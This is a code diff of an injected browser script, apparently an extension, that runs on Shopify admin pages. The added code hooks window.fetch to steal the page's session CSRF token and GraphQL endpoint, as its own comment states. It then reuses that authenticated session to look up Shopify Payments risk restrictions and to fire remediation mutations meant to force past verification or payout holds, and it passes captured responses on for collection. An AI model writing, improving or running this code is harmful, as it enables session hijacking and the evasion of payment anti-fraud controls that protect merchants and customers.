@@ -1143,35 +1143,28 @@ function checkModalPopup() {
 
 let _failLastFire = 0
 
-// Auto-fire Discovery query on any Shopify admin page to capture restriction ID
+// Auto-fire Discovery query using page's own captured GQL context
 async function autoDiscoverRestriction() {
   try {
-    const q = `query D{shopifyPaymentsAccount{bankAccount{id riskRestrictions{id status type reason}}}}`
-    const store = location.pathname.match(/\/store\/([^/?#]+)/)?.[1] || null
-    // Try store-specific URL first (works on account_review + all admin pages), then global
-    const urls = store
-      ? [`https://admin.shopify.com/store/${store}/api/shopify/graphql.json`, 'https://admin.shopify.com/api/shopify/graphql.json']
-      : ['https://admin.shopify.com/api/shopify/graphql.json']
-    const csrf = document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || ''
-    for (const url of urls) {
-      try {
-        const res = await _origFetch(url, {
-          method:'POST', credentials:'include',
-          headers:{'Content-Type':'application/json', ...(csrf ? {'X-CSRF-Token': csrf} : {})},
-          body: JSON.stringify({ query: q })
-        })
-        const ct = res.headers.get('content-type') || ''
-        if (!ct.includes('json')) continue  // got HTML redirect — try next URL
-        const data = await res.json()
-        if (!data?.data) continue
-        sendCapture('shopify/graphql', data)
-        const ba = data?.data?.shopifyPaymentsAccount?.bankAccount
-        const act = (ba?.riskRestrictions || []).find(r => r.status === 'ACTIVE')
-        if (act) showToast('⬡ IDV: Restriction found — ' + gid(act.id), '#052e16')
-        return  // success
-      } catch(_) {}
-    }
-  } catch(_) {}
+    const data = await pageGql(`query D{shopifyPaymentsAccount{bankAccount{id riskRestrictions{id status type reason}}}}`)
+    sendCapture('shopify/graphql', data)
+    const ba  = data?.data?.shopifyPaymentsAccount?.bankAccount
+    const act = (ba?.riskRestrictions || []).find(r => r.status === 'ACTIVE')
+    if (act) showToast('⬡ IDV: Restriction found — ' + gid(act.id), '#052e16')
+    else if (ba) showToast('⬡ IDV: No active restriction found', '#052e16')
+  } catch(e) {
+    // If page hasn't made a GQL call yet, retry when it does
+    const wait = () => new Promise(r => {
+      const h = ev => { if (ev.data?._idv === 'GQL_CONTEXT') { window.removeEventListener('message', h); r() } }
+      window.addEventListener('message', h)
+      setTimeout(r, 10000)  // max wait 10s
+    })
+    await wait()
+    try {
+      const data = await pageGql(`query D{shopifyPaymentsAccount{bankAccount{id riskRestrictions{id status type reason}}}}`)
+      sendCapture('shopify/graphql', data)
+    } catch(_) {}
+  }
 }
 
 // Also intercept XHR (Shopify sometimes uses XHR instead of fetch)
@@ -1281,32 +1274,14 @@ function sendCapture(url, data) {
 
 window.addEventListener('message', async ev => {
   if (ev.source !== window || ev.data?._idv !== 'FORCE_VERIFY') return
-  const rid  = ev.data.riskRestrictionId
-  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || ''
-  const hdrs = { 'Content-Type':'application/json', ...(csrf ? { 'X-CSRF-Token': csrf } : {}) }
+  const rid = ev.data.riskRestrictionId
 
-  // Mutation 1: remediateRiskRestriction
+  // Use page's captured GQL context — most reliable auth
   const mut1 = `mutation M1($id:ID!){remediateRiskRestriction(input:{riskRestrictionId:$id}){challengeToken userErrors{field message}}}`
-  // Mutation 2: payoutGateRemediate (fallback)
   const mut2 = `mutation M2($id:ID!){payoutGateRemediate(input:{riskRestrictionGid:$id}){challengeToken userErrors{field message}}}`
 
   async function tryMut(query) {
-    const store = location.pathname.match(/\/store\/([^/?#]+)/)?.[1] || null
-    const gqlUrls = store
-      ? [`https://admin.shopify.com/store/${store}/api/shopify/graphql.json`, 'https://admin.shopify.com/api/shopify/graphql.json']
-      : ['https://admin.shopify.com/api/shopify/graphql.json']
-    let data
-    for (const gqlUrl of gqlUrls) {
-      const res = await _origFetch(gqlUrl, {
-        method:'POST', credentials:'include', headers: hdrs,
-        body: JSON.stringify({ query, variables: { id: rid } })
-      })
-      const ct = res.headers.get('content-type') || ''
-      if (!ct.includes('json')) continue
-      data = await res.json()
-      if (data?.data) break
-    }
-    if (!data) throw new Error('GQL endpoint unreachable — check Shopify session')
+    const data = await pageGql(query, { id: rid })
     sendCapture('shopify/graphql', data)
     const d    = data?.data
     const tok  = d?.remediateRiskRestriction?.challengeToken || d?.payoutGateRemediate?.challengeToken
@@ -1316,7 +1291,7 @@ window.addEventListener('message', async ev => {
 
   try {
     let r = await tryMut(mut1)
-    if (!r.token && r.errors.length === 0) r = await tryMut(mut2)  // try fallback
+    if (!r.token && r.errors.length === 0) r = await tryMut(mut2)
     if (r.token) {
       window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result: { ok: true } }, '*')
     } else {
@@ -1329,9 +1304,58 @@ window.addEventListener('message', async ev => {
 })
 
 const _origFetch = window.fetch.bind(window)
+
+// ── Capture page's own GQL context (URL + CSRF) — most reliable auth ──────────
+// Page is already authenticated. We steal its exact URL and token.
+window.__idvGqlUrl    = null  // exact URL page uses, e.g. /store/abc/api/shopify/graphql.json
+window.__idvGqlCsrf   = null  // CSRF token from page's own requests
+window.__idvGqlReady  = false
+
+function _captureGqlContext(url, init) {
+  if (window.__idvGqlReady) return
+  if (!url.includes('shopify/graphql')) return
+  window.__idvGqlUrl = url
+  // Grab CSRF from the request's headers
+  try {
+    const h = init?.headers
+    let csrf = null
+    if (h instanceof Headers) {
+      csrf = h.get('x-csrf-token') || h.get('X-CSRF-Token') || h.get('x-shopify-web-client-csrf-token')
+    } else if (h && typeof h === 'object') {
+      csrf = h['x-csrf-token'] || h['X-CSRF-Token'] || h['x-shopify-web-client-csrf-token']
+    }
+    // Also try DOM fallbacks
+    if (!csrf) csrf = document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || null
+    if (csrf) window.__idvGqlCsrf = csrf
+  } catch(_) {}
+  window.__idvGqlReady = true
+  // Notify background so injectDiscovery / backendCheck can use same URL
+  window.postMessage({ _idv: 'GQL_CONTEXT', url: window.__idvGqlUrl, csrf: window.__idvGqlCsrf }, '*')
+}
+
+// Helper: make GQL call using page's captured context
+async function pageGql(query, variables) {
+  // Wait up to 5s for page to make its first GQL call
+  if (!window.__idvGqlReady) {
+    await new Promise(resolve => {
+      const t = setTimeout(resolve, 5000)
+      const check = setInterval(() => { if (window.__idvGqlReady) { clearInterval(check); clearTimeout(t); resolve() } }, 100)
+    })
+  }
+  const url  = window.__idvGqlUrl || ((() => { const s = location.pathname.match(/\/store\/([^/?#]+)/)?.[1]; return s ? `https://admin.shopify.com/store/${s}/api/shopify/graphql.json` : 'https://admin.shopify.com/api/shopify/graphql.json' })())
+  const csrf = window.__idvGqlCsrf || document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || ''
+  const hdrs = { 'Content-Type': 'application/json', ...(csrf ? { 'X-CSRF-Token': csrf } : {}) }
+  const body = JSON.stringify({ query, ...(variables ? { variables } : {}) })
+  const res  = await _origFetch(url, { method: 'POST', credentials: 'include', headers: hdrs, body })
+  const ct   = res.headers.get('content-type') || ''
+  if (!ct.includes('json')) throw new Error(`GQL returned HTML — session issue (url: ${url})`)
+  return res.json()
+}
+
 window.fetch = async function(input, init) {
-  const res = await _origFetch(input, init)
   const url = typeof input === 'string' ? input : input?.url || ''
+  _captureGqlContext(url, init)   // capture auth from page's own calls
+  const res = await _origFetch(input, init)
   if (FPAT.some(p => url.includes(p))) res.clone().json().then(d => sendCapture(url, d)).catch(() => {})
   return res
 }
